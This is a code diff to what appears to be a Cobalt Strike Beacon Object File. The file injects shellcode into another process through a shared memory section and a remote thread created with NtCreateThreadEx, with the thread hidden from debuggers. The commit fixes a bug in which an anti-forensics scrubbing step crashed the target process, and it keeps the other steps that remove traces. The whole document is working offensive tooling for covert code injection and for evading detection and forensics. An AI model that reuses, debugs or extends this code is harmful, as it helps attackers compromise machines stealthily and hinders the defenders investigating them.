@@ -9,7 +9,7 @@
  *   [4] handle leaks         → close hRemoteProcess and hThread
  *   [5] error checks         → OpenProcess, NtCreateThreadEx, cascading
  *
- * patches-v2 (this commit):
+ * patches-v2:
  *   [P1] THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER on NtCreateThreadEx —
  *        the new thread is invisible to any debugger attached to the
  *        target (DbgUiRemoteBreakin / DebugActiveProcess callbacks).
@@ -24,11 +24,23 @@
  *        e.g. "0xC0000022 STATUS_ACCESS_DENIED (target ACL / session
  *        mismatch)" instead of raw hex only.
  *   [P5] Anti-forensics scrubbing via zero_fill_bytes() helper — zero
- *        the local view bytes before unmap, zero the beacon-owned
- *        shellcode buffer we were given, NULL out our local pointer.
- *        Prevents residual shellcode from sitting in the beacon
- *        process's address space or in our stack frame after this BOF
- *        returns.
+ *        the beacon-owned shellcode buffer we were given, NULL out
+ *        our local pointer, unmap the local view. (⚠ patches-v2 also
+ *        zeroed the local section view here — see patches-v3 note
+ *        below for why that was wrong and got removed.)
+ *
+ * patches-v3 (this commit) — critical bugfix:
+ *   patches-v2 [P5]'s "zero the local view before unmap" step was
+ *   destructive. The local view and the remote view are two mappings
+ *   of the SAME section pages — zeroing the local view also zeros
+ *   what the target sees via the remote view, so the injected thread
+ *   would jump to NUL bytes and crash the target (reproduced on a
+ *   notepad respawn — target process died immediately after
+ *   NtCreateThreadEx). Removed the destructive scrub; the other two
+ *   [P5] steps (zeroing the beacon-owned shellcode buffer + NULL'ing
+ *   our local pointer) are still correct and are retained. Unmapping
+ *   the local view alone is already sufficient anti-forensics from
+ *   our side — the target keeps its remote view, we lose ours.
  *
  * Deliberately NOT patched (both on the roadmap):
  *   [2]  Section is PAGE_EXECUTE_READWRITE — required so we can hold
@@ -195,18 +207,30 @@ void go(char * args, int len) {
     /* Copy shellcode via the local RW view — no cross-process write. */
     mycopy(baseAddrLocal, shellcode, (int)shellcodeSize);
 
-    /* Patch [P5], patches-v2: anti-forensics scrubbing before we unmap.
-     *   1. Zero the local view bytes — nothing to page out later.
-     *   2. Zero the beacon-owned shellcode buffer BeaconDataExtract gave
-     *      us — beacon frees it after we return but no reason to leave
-     *      the shellcode live in the interim.
+    /* Patch [P5], patches-v2 — anti-forensics scrubbing.
+     *
+     * ⚠ CORRECTNESS NOTE (patches-v3 bugfix): the local view and the
+     * remote view are two mappings of the SAME underlying section
+     * pages. Zeroing the local view here ALSO zeros what the target
+     * process sees via the remote view — the thread we're about to
+     * create would then execute NUL bytes and crash the target. So:
+     *
+     *   1. DO NOT zero baseAddrLocal — the section pages are shared.
+     *      Rely on NtUnmapViewOfSection below to remove OUR view; the
+     *      remote view stays mapped for the injected thread.
+     *   2. DO zero the beacon-owned shellcode buffer BeaconDataExtract
+     *      handed us — that's a separate allocation, not part of the
+     *      section. Safe to scrub, and beacon frees it right after we
+     *      return anyway.
      *   3. NULL our local pointer so the stack frame doesn't reference
-     *      it after this call returns. */
-    zero_fill_bytes((char*)baseAddrLocal, shellcodeSize);
+     *      it after this call returns.
+     */
     zero_fill_bytes(shellcode, shellcodeSize);
     shellcode = NULL;
 
-    /* Unmap the local view. */
+    /* Unmap the local view. Section pages themselves stay alive as
+     * long as the remote view holds them, so this only revokes OUR
+     * access — the target still sees the shellcode. */
     NTDLL$NtUnmapViewOfSection(hLocalProcess, baseAddrLocal);
     baseAddrLocal = NULL;
 
